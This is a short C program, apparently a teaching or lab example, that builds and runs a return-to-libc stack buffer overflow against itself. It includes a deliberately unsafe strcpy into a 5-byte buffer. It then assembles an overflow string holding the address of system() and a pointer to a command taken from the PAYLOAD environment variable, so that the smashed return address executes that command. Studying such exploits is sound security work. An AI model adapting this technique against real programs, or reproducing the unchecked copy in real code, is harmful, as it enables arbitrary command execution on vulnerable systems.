#include <string.h>
#include <stdlib.h>
#include <stdio.h>

#define BUF_SIZE 5


void smash(char *arg)
{
    char buffer[BUF_SIZE];

    strcpy(buffer, arg);

}

void main(int argc, char* argv[])
{

    char* varname = "PAYLOAD";
    char* payloadptr = getenv(varname);
    void* systemptr = *system;
    char systemptr_asstring[10];
    char payloadptr_asstring[10];
    snprintf(systemptr_asstring, 10, "%08x", (unsigned int)systemptr);
    snprintf(payloadptr_asstring, 10, "%08x", (unsigned int)payloadptr);
    printf("PAYLOAD=%s, address=%p\n", payloadptr, payloadptr);
    printf("system() address=%p\n", systemptr);
    
    int cmdlength = 21;
    unsigned char* command = (unsigned char*)malloc(cmdlength);
    memset(command, 0, cmdlength);
    memset(command, 'A', 5);
    memset(command+5, 'B', 4);
    command[9] = (unsigned char)((unsigned int)systemptr >> (8*0)) & 0xff;
    command[10] = (unsigned char)((unsigned int)systemptr >> (8*1)) & 0xff;
    command[11] = (unsigned char)((unsigned int)systemptr >> (8*2)) & 0xff;
    command[12] = (unsigned char)((unsigned int)systemptr >> (8*3)) & 0xff;
    memset(command+13, 'D', 4);
    command[17] = (unsigned char)((unsigned int)payloadptr >> (8*0)) & 0xff;
    command[18] = (unsigned char)((unsigned int)payloadptr >> (8*1)) & 0xff;
    command[19] = (unsigned char)((unsigned int)payloadptr >> (8*2)) & 0xff;
    command[20] = (unsigned char)((unsigned int)payloadptr >> (8*3)) & 0xff;
    printf("Shellcode = ");
    for(int i = 0; i < cmdlength; i++)
    {
        printf("%02x", command[i]);
    }
    printf("\n");

    smash(command);

}

